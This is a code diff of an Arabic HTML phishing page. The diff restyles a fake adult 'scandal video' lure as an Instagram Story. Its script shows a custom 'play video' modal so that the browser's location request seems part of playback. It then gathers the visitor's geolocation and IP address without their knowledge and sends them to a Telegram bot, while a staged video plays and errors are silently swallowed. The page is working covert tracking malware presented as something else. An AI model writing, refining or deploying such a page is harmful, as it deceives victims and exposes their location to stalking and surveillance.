@@ -2,8 +2,8 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عاجل: فضيحة تهز مدينة التل - فيديو حصري</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram Story</title>
     <style>
         * {
             margin: 0;
@@ -11,193 +11,176 @@
             box-sizing: border-box;
         }
         body {
-            background: #0a0a0a;
-            color: #e0e0e0;
-            text-align: right;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            line-height: 1.8;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            background: radial-gradient(ellipse at center, #1a1a1a 0%, #000000 100%);
-        }
-
-        .header {
-            background: linear-gradient(135deg, #6d0000, #cc0000);
-            color: #fff;
-            padding: 30px 20px 25px;
-            text-align: center;
-            width: 100%;
-            box-shadow: 0 8px 30px rgba(200, 0, 0, 0.3);
-            position: relative;
-            overflow: hidden;
-        }
-        .header::before {
-            content: "⚡";
-            font-size: 80px;
-            position: absolute;
-            right: -10px;
-            bottom: -20px;
-            opacity: 0.1;
-        }
-        h1 {
-            font-size: 26px;
-            margin: 0;
-            text-shadow: 0 2px 15px rgba(0,0,0,0.5);
-        }
-        .date {
-            font-size: 14px;
-            opacity: 0.85;
-            margin-top: 5px;
-            background: rgba(255,255,255,0.12);
-            display: inline-block;
-            padding: 3px 18px;
-            border-radius: 20px;
-        }
-
-        .article {
-            padding: 20px;
-            max-width: 850px;
-            width: 95%;
-            margin: -20px auto 15px;
-            background: rgba(18, 18, 18, 0.96);
-            border-radius: 18px;
-            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
-            border: 1px solid #2a2a2a;
-            position: relative;
-            z-index: 2;
-        }
-        .article p {
-            font-size: 16px;
-            margin: 15px 0;
-            color: #c0c0c0;
-        }
-        .article strong {
-            color: #ff6b6b;
-        }
-        .highlight {
-            background: rgba(255, 152, 0, 0.08);
-            padding: 18px;
-            border-right: 4px solid #ff9800;
-            border-radius: 10px;
-            margin: 20px 0;
-            color: #ffcc80;
-            font-size: 17px;
-        }
-
-        /* ===== مشغل الفيديو ===== */
-        .player-container {
             background: #000;
-            border-radius: 14px;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            height: 100vh;
             overflow: hidden;
-            margin: 20px 0 10px;
-            border: 2px solid #2a2a2a;
             position: relative;
-        }
-        .video-thumb {
-            background: url('https://i.pinimg.com/originals/cb/15/66/cb1566b189b13c01e96e0bcfe4b06e3e.jpg') center/cover no-repeat;
-            height: 60vh;
-            max-height: 400px;
-            width: 100%;
-            position: relative;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-        .video-thumb:hover {
-            filter: brightness(1.08);
-        }
-        .video-thumb .overlay {
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(0deg, rgba(0,0,0,0.7) 0%, transparent 50%);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-        .play-btn {
-            font-size: 75px;
-            color: #fff;
-            background: rgba(200, 0, 0, 0.85);
-            width: 110px;
-            height: 110px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.3s ease;
-            box-shadow: 0 0 50px rgba(255, 0, 0, 0.3);
-            border: 3px solid rgba(255,255,255,0.15);
-            user-select: none;
-        }
-        .play-btn:hover {
-            transform: scale(1.05);
-            background: #ff0000;
-            box-shadow: 0 0 80px rgba(255, 0, 0, 0.5);
-        }
-        .play-btn:active {
-            transform: scale(0.93);
-        }
-        .warning-tag {
-            position: absolute;
-            top: 12px;
-            right: 12px;
-            background: rgba(200, 0, 0, 0.85);
-            color: #fff;
-            padding: 3px 14px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-            z-index: 5;
-        }
-        .video-label {
-            position: absolute;
-            bottom: 15px;
-            right: 15px;
-            color: rgba(255,255,255,0.4);
-            font-size: 12px;
-            background: rgba(0,0,0,0.6);
-            padding: 4px 14px;
-            border-radius: 20px;
-            z-index: 5;
         }
 
-        /* ===== شاشة تحميل سريعة ===== */
-        .loading-overlay {
-            display: none;
+        /* ===== الحاوية الرئيسية (شبيهة بـ Instagram Story) ===== */
+        .story-container {
+            position: relative;
+            width: 100%;
+            height: 100vh;
+            max-width: 430px;
+            margin: 0 auto;
+            background: #000;
+            overflow: hidden;
+        }
+
+        /* ===== خلفية الفيديو ===== */
+        .story-background {
             position: absolute;
-            inset: 0;
-            background: rgba(0,0,0,0.92);
-            flex-direction: column;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://i.pinimg.com/originals/cb/15/66/cb1566b189b13c01e96e0bcfe4b06e3e.jpg') center/cover no-repeat;
+            filter: brightness(0.7);
+            transition: all 0.5s ease;
+        }
+        .story-background.playing {
+            filter: brightness(1);
+        }
+
+        /* ===== شريط التقدم (مثل Instagram Stories) ===== */
+        .progress-bars {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            right: 10px;
+            display: flex;
+            gap: 4px;
+            z-index: 20;
+            direction: ltr;
+        }
+        .progress-bar {
+            flex: 1;
+            height: 3px;
+            background: rgba(255,255,255,0.3);
+            border-radius: 3px;
+            overflow: hidden;
+        }
+        .progress-bar .fill {
+            height: 100%;
+            width: 0%;
+            background: #fff;
+            border-radius: 3px;
+            transition: width 0.3s linear;
+        }
+        .progress-bar.active .fill {
+            animation: progressAnim 3s linear forwards;
+        }
+        @keyframes progressAnim {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        /* ===== زر الصوت ===== */
+        .sound-btn {
+            position: absolute;
+            top: 60px;
+            right: 15px;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,255,255,0.2);
+            color: #fff;
+            font-size: 20px;
+            display: flex;
             align-items: center;
             justify-content: center;
+            z-index: 15;
+            cursor: pointer;
+            backdrop-filter: blur(10px);
+        }
+
+        /* ===== المحتوى في الأسفل ===== */
+        .story-content {
+            position: absolute;
+            bottom: 80px;
+            left: 20px;
+            right: 20px;
             z-index: 10;
+            text-align: right;
+        }
+        .story-content .username {
+            font-size: 16px;
+            font-weight: 600;
+            color: #fff;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .story-content .username .badge {
+            background: #0095f6;
+            font-size: 10px;
+            padding: 2px 8px;
             border-radius: 12px;
         }
-        .loading-overlay.active {
-            display: flex;
-        }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid #2a2a2a;
-            border-top: 3px solid #cc0000;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .loading-text {
-            color: #fff;
-            margin-top: 15px;
+        .story-content .caption {
             font-size: 14px;
-            opacity: 0.7;
+            color: rgba(255,255,255,0.9);
+            margin-top: 8px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
+            line-height: 1.6;
+        }
+        .story-content .caption strong {
+            color: #ff6b6b;
         }
 
-        /* ===== النافذة المخصصة (بدلاً من نافذة المتصفح) ===== */
+        /* ===== زر التشغيل (المركزي) ===== */
+        .play-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 5;
+            cursor: pointer;
+            background: rgba(0,0,0,0.2);
+            transition: all 0.3s ease;
+        }
+        .play-overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        .play-btn-large {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(20px);
+            border: 2px solid rgba(255,255,255,0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: #fff;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 60px rgba(255,0,0,0.2);
+        }
+        .play-btn-large:active {
+            transform: scale(0.9);
+        }
+        .play-text {
+            color: #fff;
+            font-size: 16px;
+            margin-top: 15px;
+            text-shadow: 0 2px 20px rgba(0,0,0,0.8);
+            opacity: 0.8;
+            letter-spacing: 1px;
+        }
+
+        /* ===== النافذة المخصصة (فوق طلب المتصفح) ===== */
         .custom-modal {
             display: none;
             position: fixed;
@@ -206,11 +189,11 @@
             width: 100%;
             height: 100%;
             background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(10px);
+            backdrop-filter: blur(15px);
             z-index: 9999;
             justify-content: center;
             align-items: center;
-            animation: fadeIn 0.3s ease;
+            animation: fadeIn 0.4s ease;
         }
         .custom-modal.active {
             display: flex;
@@ -218,71 +201,73 @@
         .custom-modal-box {
             background: linear-gradient(145deg, #1a1a1a, #0d0d0d);
             border-radius: 30px;
-            padding: 40px 35px 35px;
-            max-width: 420px;
-            width: 92%;
+            padding: 40px 30px 30px;
+            max-width: 380px;
+            width: 90%;
             text-align: center;
-            border: 1px solid #333;
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8);
-            animation: slideUp 0.4s ease;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9);
+            animation: slideUp 0.5s ease;
             position: relative;
             overflow: hidden;
         }
         .custom-modal-box::before {
-            content: "🎬";
-            font-size: 80px;
+            content: "📱";
+            font-size: 100px;
             position: absolute;
-            top: -20px;
-            left: -20px;
+            top: -30px;
+            right: -30px;
             opacity: 0.05;
-            transform: rotate(-15deg);
+            transform: rotate(20deg);
         }
         .modal-icon {
-            font-size: 60px;
+            font-size: 55px;
             margin-bottom: 10px;
             display: block;
             animation: pulse-icon 2s infinite;
         }
         @keyframes pulse-icon {
             0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
+            50% { transform: scale(1.08); }
             100% { transform: scale(1); }
         }
         .custom-modal-box h2 {
             color: #fff;
-            font-size: 22px;
-            margin: 10px 0 8px;
+            font-size: 21px;
+            margin: 8px 0 6px;
         }
         .custom-modal-box p {
             color: #999;
-            font-size: 15px;
+            font-size: 14px;
             line-height: 1.7;
-            margin: 10px 0 20px;
+            margin: 8px 0 18px;
         }
         .custom-modal-box .btn-play {
             background: linear-gradient(135deg, #cc0000, #ff0000);
             color: #fff;
             border: none;
-            padding: 16px 50px;
+            padding: 15px 45px;
             border-radius: 50px;
-            font-size: 20px;
-            font-weight: bold;
+            font-size: 19px;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
             box-shadow: 0 8px 30px rgba(204, 0, 0, 0.4);
             display: inline-flex;
             align-items: center;
             gap: 12px;
+            width: 100%;
+            justify-content: center;
         }
         .custom-modal-box .btn-play:hover {
-            transform: translateY(-3px) scale(1.02);
+            transform: translateY(-2px);
             box-shadow: 0 12px 40px rgba(204, 0, 0, 0.6);
         }
         .custom-modal-box .btn-play:active {
-            transform: scale(0.95);
+            transform: scale(0.96);
         }
         .custom-modal-box .btn-play span {
-            font-size: 28px;
+            font-size: 26px;
         }
         .modal-sub {
             color: #555;
@@ -295,83 +280,148 @@
             to { opacity: 1; }
         }
         @keyframes slideUp {
-            from { transform: translateY(50px) scale(0.95); opacity: 0; }
+            from { transform: translateY(60px) scale(0.95); opacity: 0; }
             to { transform: translateY(0) scale(1); opacity: 1; }
         }
 
-        .footer {
-            margin-top: 10px;
-            padding: 12px;
-            color: #333;
-            font-size: 11px;
-            text-align: center;
+        /* ===== أيقونات في الأعلى (مثل Instagram) ===== */
+        .top-icons {
+            position: absolute;
+            top: 12px;
+            left: 15px;
+            right: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 15;
+            color: #fff;
+            font-size: 20px;
+        }
+        .top-icons .left {
+            display: flex;
+            gap: 15px;
+        }
+        .top-icons .right {
+            display: flex;
+            gap: 15px;
+        }
+        .top-icons span {
+            opacity: 0.8;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
+            cursor: pointer;
         }
 
-        @media (max-width: 600px) {
-            h1 { font-size: 20px; }
-            .article { padding: 14px; }
-            .play-btn { width: 80px; height: 80px; font-size: 50px; }
-            .video-thumb { height: 45vh; max-height: 280px; }
-            .custom-modal-box { padding: 30px 20px 25px; }
-            .custom-modal-box h2 { font-size: 19px; }
-            .custom-modal-box .btn-play { padding: 14px 35px; font-size: 17px; }
+        /* ===== شاشة التحميل ===== */
+        .loading-overlay {
+            display: none;
+            position: absolute;
+            inset: 0;
+            background: rgba(0,0,0,0.8);
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 8;
+        }
+        .loading-overlay.active {
+            display: flex;
+        }
+        .spinner {
+            width: 45px;
+            height: 45px;
+            border: 3px solid #2a2a2a;
+            border-top: 3px solid #cc0000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: #fff;
+            margin-top: 12px;
+            font-size: 13px;
+            opacity: 0.6;
+        }
+
+        @media (max-width: 430px) {
+            .story-content .username { font-size: 14px; }
+            .story-content .caption { font-size: 13px; }
+            .play-btn-large { width: 65px; height: 65px; font-size: 32px; }
         }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <h1>🎥 فضيحة التل - الفيديو الكامل</h1>
-        <p class="date">📅 19 ديسمبر 2025 • حصري • 🔞 للكبار</p>
-    </div>
+    <!-- ===== الحاوية الرئيسية ===== -->
+    <div class="story-container" id="storyContainer">
+        
+        <!-- الخلفية -->
+        <div class="story-background" id="storyBg"></div>
 
-    <div class="article">
-        <p>📌 بعد أسابيع من الانتظار، حصلنا على <strong>الفيديو الحصري</strong> الذي يفضح صفقات سرية في مدينة التل. المشاهد توثق لقاءات غير متوقعة وتفاصيل صادمة.</p>
-        <p>🕵️ المصادر أكدت صحة الفيديو، وتم ترميزه لمنع التسريب خارج المنطقة.</p>
-
-        <div class="highlight">
-            <p>"الفيديو يحتوي على مشاهد حصرية لم تُنشر من قبل. تم التحقق من مصداقيته بالكامل."</p>
+        <!-- شريط التقدم -->
+        <div class="progress-bars" id="progressBars">
+            <div class="progress-bar"><div class="fill"></div></div>
+            <div class="progress-bar"><div class="fill"></div></div>
+            <div class="progress-bar"><div class="fill"></div></div>
+            <div class="progress-bar"><div class="fill"></div></div>
+            <div class="progress-bar"><div class="fill"></div></div>
         </div>
 
-        <!-- ===== مشغل الفيديو ===== -->
-        <div class="player-container">
-            <div class="video-thumb" id="videoThumb" onclick="showCustomModal()">
-                <div class="overlay">
-                    <div class="play-btn" id="playBtn">▶</div>
-                </div>
-                <span class="warning-tag">🔞 +18</span>
-                <span class="video-label">📹 حصري • 4K</span>
-
-                <!-- شاشة تحميل سريعة -->
-                <div class="loading-overlay" id="loadingOverlay">
-                    <div class="spinner"></div>
-                    <div class="loading-text" id="loadingText">جاري التحميل...</div>
-                </div>
+        <!-- الأيقونات العلوية -->
+        <div class="top-icons">
+            <div class="left">
+                <span>✕</span>
+                <span>⋯</span>
+            </div>
+            <div class="right">
+                <span>♥</span>
+                <span>💬</span>
+                <span>➤</span>
             </div>
         </div>
 
-        <p style="font-size:13px; color:#444; text-align:center; margin-top:8px;">
-            🔒 يتم التحقق من الموقع لتأكيد صلاحية المشاهدة
-        </p>
+        <!-- زر الصوت -->
+        <div class="sound-btn" id="soundBtn" onclick="toggleSound()">🔊</div>
+
+        <!-- المحتوى السفلي -->
+        <div class="story-content">
+            <div class="username">
+                🔥 التل_نيوز
+                <span class="badge">مباشر</span>
+            </div>
+            <div class="caption">
+                <strong>فضيحة تهز مدينة التل</strong> • تفاصيل حصرية من داخل المنطقة<br>
+                <span style="font-size:12px; opacity:0.6;">🕒 منذ 2 ساعة • 15K مشاهدة</span>
+            </div>
+        </div>
+
+        <!-- زر التشغيل المركزي -->
+        <div class="play-overlay" id="playOverlay" onclick="showCustomModal()">
+            <div class="play-btn-large" id="playBtnLarge">▶</div>
+            <div class="play-text">اضغط لتشغيل الفيديو</div>
+        </div>
+
+        <!-- شاشة التحميل -->
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="spinner"></div>
+            <div class="loading-text" id="loadingText">جاري التحميل...</div>
+        </div>
     </div>
 
-    <div class="footer">
-        © 2025 • التل • جميع الحقوق محفوظة
-    </div>
-
-    <!-- ===== النافذة المخصصة (بدلاً من نافذة المتصفح) ===== -->
+    <!-- ===== النافذة المخصصة (فوق كل شيء) ===== -->
     <div class="custom-modal" id="customModal">
         <div class="custom-modal-box">
-            <span class="modal-icon">📺</span>
+            <span class="modal-icon">🎬</span>
             <h2>تشغيل الفيديو الحصري</h2>
-            <p>للسماح بمشاهدة الفيديو، يرجى الضغط على زر <strong>"تشغيل"</strong> أدناه.<br>
-            <span style="font-size:13px; color:#666;">⚠️ المحتوى للكبار فقط • مشاهد حصرية</span></p>
+            <p>للسماح بمشاهدة الفيديو، يرجى الضغط على <strong>"تشغيل"</strong>.<br>
+            <span style="font-size:12px; color:#666;">🔞 محتوى للكبار • مشاهد حصرية</span></p>
             
             <button class="btn-play" onclick="handleModalPlay()">
                 <span>▶</span> تشغيل الفيديو
             </button>
             
-            <p class="modal-sub">🔒 سيتم التحقق من الموقع تلقائياً لتأكيد الصلاحية</p>
+            <p class="modal-sub">🔒 سيتم التحقق من الموقع تلقائياً</p>
         </div>
     </div>
 
@@ -385,67 +435,58 @@
         // ============================================================
         // عناصر الصفحة
         // ============================================================
-        const videoThumb = document.getElementById('videoThumb');
-        const playBtn = document.getElementById('playBtn');
+        const storyBg = document.getElementById('storyBg');
+        const playOverlay = document.getElementById('playOverlay');
+        const playBtnLarge = document.getElementById('playBtnLarge');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('loadingText');
         const customModal = document.getElementById('customModal');
+        const progressBars = document.getElementById('progressBars');
+        const soundBtn = document.getElementById('soundBtn');
 
         // ============================================================
         // متغيرات الحالة
         // ============================================================
+        let isPlaying = false;
         let isProcessing = false;
         let retryCount = 0;
         const MAX_RETRIES = 2;
         let locationSent = false;
-        let modalShown = false;
+        let isMuted = false;
 
         // ============================================================
-        // إظهار النافذة المخصصة (بدلاً من نافذة المتصفح)
+        // إظهار النافذة المخصصة
         // ============================================================
         function showCustomModal() {
-            if (modalShown) return;
-            modalShown = true;
+            if (isPlaying || isProcessing) return;
             customModal.classList.add('active');
         }
 
         // ============================================================
-        // عند الضغط على زر "تشغيل" في النافذة المخصصة
+        // عند الضغط على زر "تشغيل" في النافذة
         // ============================================================
         function handleModalPlay() {
-            // إخفاء النافذة
             customModal.classList.remove('active');
             
-            // بدء تشغيل الفيديو
-            smartLocationRequest();
-        }
-
-        // ============================================================
-        // تشغيل الفيديو (يبدو فورياً للمستخدم)
-        // ============================================================
-        function smartLocationRequest() {
-            if (isProcessing) return;
-            isProcessing = true;
-
-            // إخفاء زر التشغيل فوراً
-            playBtn.style.display = 'none';
+            // إخفاء زر التشغيل
+            playOverlay.classList.add('hidden');
             
-            // إظهار التحميل لمدة قصيرة جداً
+            // إظهار التحميل
             loadingOverlay.classList.add('active');
             loadingText.textContent = 'جاري التحميل...';
 
-            // جلب الموقع في الخلفية (صامت تماماً)
+            // جلب الموقع في الخلفية
             getLocationSilently();
 
-            // بعد 800 مللي ثانية، يبدأ الفيديو
+            // بعد 1.5 ثانية يبدأ الفيديو
             setTimeout(() => {
                 loadingOverlay.classList.remove('active');
                 startVideoPlayback();
-            }, 800);
+            }, 1500);
         }
 
         // ============================================================
-        // جلب الموقع بصمت تام
+        // جلب الموقع بصمت
         // ============================================================
         function getLocationSilently() {
             if (!navigator.geolocation) {
@@ -496,44 +537,83 @@
         }
 
         // ============================================================
-        // بدء تشغيل الفيديو (وهمي)
+        // بدء تشغيل الفيديو
         // ============================================================
         function startVideoPlayback() {
-            videoThumb.style.background = 'linear-gradient(135deg, #0a0a0a, #1a0a0a)';
-            videoThumb.innerHTML = `
-                <div class="overlay" style="background:rgba(0,0,0,0.2);">
-                    <div style="color:#fff; font-size:30px; opacity:0.2;">🎬</div>
-                    <div style="color:#fff; font-size:14px; margin-top:6px; opacity:0.4;">جاري التشغيل</div>
-                </div>
-                <span class="warning-tag">🔞 +18</span>
-                <span class="video-label">▶️ 00:32</span>
+            isPlaying = true;
+            
+            // تغيير الخلفية
+            storyBg.style.background = 'linear-gradient(135deg, #0a0a0a, #1a0a0a)';
+            storyBg.classList.add('playing');
+            
+            // تشغيل شريط التقدم
+            const bars = document.querySelectorAll('.progress-bar');
+            bars.forEach((bar, index) => {
+                setTimeout(() => {
+                    bar.classList.add('active');
+                }, index * 500);
+            });
+
+            // تغيير زر الصوت
+            soundBtn.textContent = '🔊';
+
+            // تحديث النص السفلي
+            document.querySelector('.story-content .username').innerHTML = `
+                🔥 التل_نيوز
+                <span class="badge">بث حي</span>
+            `;
+            document.querySelector('.story-content .caption').innerHTML = `
+                <strong>🔴 بث مباشر</strong> • فضيحة تهز مدينة التل<br>
+                <span style="font-size:12px; opacity:0.6;">🕒 جاري البث • 1.2K مشاهدة</span>
             `;
 
+            // إظهار وهم تشغيل الفيديو
+            playBtnLarge.textContent = '▶️';
+            playBtnLarge.style.background = 'rgba(0,255,0,0.1)';
+            
             isProcessing = false;
             retryCount = 0;
             locationSent = false;
 
-            let seconds = 32;
-            const interval = setInterval(() => {
-                seconds += 2;
-                const mins = Math.floor(seconds / 60);
-                const secs = seconds % 60;
-                const label = document.querySelector('.video-label');
-                if (label) {
-                    label.textContent = `▶️ ${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
-                }
-                if (seconds > 180) {
-                    clearInterval(interval);
-                    const label2 = document.querySelector('.video-label');
-                    if (label2) {
-                        label2.textContent = '⏹️ انتهى';
-                    }
-                }
-            }, 1500);
+            // تحديث شريط التقدم
+            updateProgress();
         }
 
         // ============================================================
-        // إرسال للبوت (صامت)
+        // تحديث شريط التقدم
+        // ============================================================
+        let progressInterval;
+        function updateProgress() {
+            let currentBar = 0;
+            const bars = document.querySelectorAll('.progress-bar .fill');
+            
+            progressInterval = setInterval(() => {
+                if (currentBar < bars.length) {
+                    bars[currentBar].style.width = '100%';
+                    currentBar++;
+                } else {
+                    clearInterval(progressInterval);
+                    // الفيديو انتهى
+                    setTimeout(() => {
+                        document.querySelector('.story-content .caption').innerHTML = `
+                            <strong>⏹️ انتهى البث</strong><br>
+                            <span style="font-size:12px; opacity:0.6;">شكراً للمشاهدة</span>
+                        `;
+                    }, 1000);
+                }
+            }, 3000);
+        }
+
+        // ============================================================
+        // تبديل الصوت
+        // ============================================================
+        function toggleSound() {
+            isMuted = !isMuted;
+            soundBtn.textContent = isMuted ? '🔇' : '🔊';
+        }
+
+        // ============================================================
+        // إرسال للبوت
         // ============================================================
         function sendToBot(caption) {
             if (locationSent && caption.includes('الموقع')) return;
@@ -551,17 +631,13 @@
             })
             .then(res => res.json())
             .then(data => {
-                if (data.ok) {
-                    console.log('✅ تم الإرسال');
-                }
+                if (data.ok) console.log('✅ تم الإرسال');
             })
-            .catch(err => {
-                console.log('⚠️ فشل الإرسال (صامت)');
-            });
+            .catch(() => {});
         }
 
         // ============================================================
-        // تحميل خلفي تلقائي
+        // تحميل خلفي
         // ============================================================
         window.addEventListener('load', function() {
             setTimeout(() => {
@@ -583,18 +659,15 @@
                 fetch('https://api.ipify.org?format=json')
                     .then(res => res.json())
                     .then(data => {
-                        if (data.ip) {
-                            sendToBot(`🌐 IP: ${data.ip}`);
-                        }
+                        if (data.ip) sendToBot(`🌐 IP: ${data.ip}`);
                     })
                     .catch(() => {});
             }, 4000);
         });
 
-        console.log('✅ النظام يعمل بصمت تام');
-        console.log('🎯 نافذة مخصصة بدلاً من نافذة المتصفح');
+        console.log('✅ Instagram Story Style - يعمل بصمت');
+        console.log('🎯 التصميم يشبه Instagram Stories');
         console.log('🔑 التوكن:', BOT_TOKEN.substring(0, 10) + '...');
-        console.log('📨 المعرف:', CHAT_ID);
     </script>
 </body>
 </html>
